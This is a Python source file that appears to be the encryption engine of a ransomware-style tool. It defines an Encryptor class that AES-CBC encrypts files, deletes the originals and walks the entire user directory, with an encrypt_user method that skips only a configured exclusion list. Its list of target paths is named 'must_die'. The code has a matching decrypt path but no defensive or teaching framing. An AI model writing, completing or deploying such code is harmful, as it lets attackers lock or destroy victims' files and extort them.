from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os
from config import KEY_FILE, KEY_SIZE, IV_SIZE, PAD_SIZE, EXT, UNTOUCHED, USER_DIR


class Encryptor:
    def __init__(self):
        self.key = os.urandom(KEY_SIZE)
        with open(KEY_FILE, 'wb') as file:
            file.write(self.key)
        print(f'Default key generated at {KEY_FILE}')
        
    def gen_key(self, key_file: str = KEY_FILE):
        self.key = os.urandom(KEY_SIZE)
        with open(key_file, 'wb') as file:
            file.write(self.key)
        print(f'Key has been generated at {key_file}')

    def read_key(self, key_file: str = KEY_FILE):
        if not os.path.exists(key_file):
            print(f'{key_file} doesn\'t exists. The key cannot be read')
            print(f'Using default key at {KEY_FILE}')
            return
        if os.path.isdir(key_file):
            print(f'{key_file} is a folder. Nothing to do')
            print(f'Using default key at {KEY_FILE}')
            return
        if os.path.getsize(key_file) == 0:
            print(f'{key_file} is empty')
            self.gen_key(key_file)
            return
        with open(key_file, 'rb') as file:
            self.key = file.read()

    def encrypt_file(self, file_path):
        if not os.path.exists(file_path):
            print(f'{file_path} doesn\'t exists' )
            return
        if not os.path.isfile(file_path):
            print(f'{file_path} is not a file')
            return
        iv = os.urandom(IV_SIZE)
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        try:
             with open(file_path, 'rb') as file:
                plain = file.read()
        except PermissionError:
            return
        except OSError:
            return
        padder = padding.PKCS7(PAD_SIZE).padder()
        padded_data = padder.update(plain) + padder.finalize()
        cypher_txt = encryptor.update(padded_data) + encryptor.finalize()
        encr = f'{file_path}{EXT}'
        res_data = iv + cypher_txt
        try:
            with open(encr, 'wb') as file:
                file.write(res_data)
            os.remove(file_path)
        except PermissionError:
            return
        except OSError:
            return
    
    def decrypt_file(self, file_path):
        if not os.path.exists(file_path):
            print(f'{file_path} doesn\'t exists' )
            return
        if not os.path.isfile(file_path):
            print(f'{file_path} is not a file')
            return
        if not file_path.endswith(EXT):
            print(f'{file_path} is not encrypted or you have to change config')
            return
        try:
            with open(file_path, 'rb') as file:
                data = file.read()
        except PermissionError:
            return
        except OSError:
            return
        iv = data[:IV_SIZE]
        cipher_txt = data[IV_SIZE:]
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(cipher_txt) + decryptor.finalize()
        unpadder = padding.PKCS7(PAD_SIZE).unpadder()
        unpadded_data = unpadder.update(decrypted_data) + unpadder.finalize()
        file = file_path.replace(EXT, '')
        try:
            with open(file, 'wb') as result:
                result.write(unpadded_data)
            os.remove(file_path)
        except PermissionError:
            return
        except OSError:
            return
    
    def encrypt_folder(self, folder):
        files = Encryptor.get_folder_files(folder)
        [self.encrypt_file(file) for file in files]
    
    def decrypt_folder(self, folder):
        files = Encryptor.get_folder_files(folder)
        [self.decrypt_file(file) for file in files]
    
    def encrypt_folder_recursive(self, folder):
        source = Encryptor.get_folder_recursive(folder)
        [self.encrypt_folder(item) if os.path.isdir(item) else self.encrypt_file(item) for item in source]
    
    def decrypt_folder_recursive(self, folder):
        source = Encryptor.get_folder_recursive(folder)
        [self.decrypt_folder(item) if os.path.isdir(item) else self.decrypt_file(item) for item in source]
    
    def encrypt_user(self):
        user = Encryptor.get_folder_recursive(USER_DIR)
        [self.encrypt_folder(item) if os.path.isdir(item) else self.encrypt_file(item) for item in user]
    
    def decrypt_user(self):
        user = Encryptor.get_folder_recursive(USER_DIR)
        [self.decrypt_folder(item) if os.path.isdir(item) else self.decrypt_file(item) for item in user]
    
    @staticmethod
    def get_folder_files(folder):
        if not os.path.exists(folder):
            print(f'Folder {folder} doesn\'t exists')
            return ['']
        if not os.path.isdir(folder):
            print(f'{folder} is not a folder')
            return ['']
        try:
            files = [os.path.join(folder, file) for file in os.listdir(folder) if os.path.isfile(os.path.join(folder, file))]
            return files
        except PermissionError:
            return ['']
    
    @staticmethod
    def get_folder_recursive(folder):
        if not os.path.exists(folder):
            print(f'Folder {folder} doesn\'t exists')
            return ['']
        if not os.path.isdir(folder):
            print(f'{folder} is not a folder')
            return ['']
        must_die = []
        for root, dirs, files in os.walk(folder):
            for item in dirs + files:
                full_path = os.path.join(root, item)
                if Encryptor.is_ignore(full_path):
                    continue
                else:
                    must_die.append(full_path)
        return must_die
    
    @staticmethod
    def is_ignore(some_string):
        check = some_string.lower()
        if any([(check == item) for item in UNTOUCHED]):
            return True
        elif any([(check in item) for item in UNTOUCHED]):
            return True
        elif any([(item in check) for item in UNTOUCHED]):
            return True
        else:
            return False            
    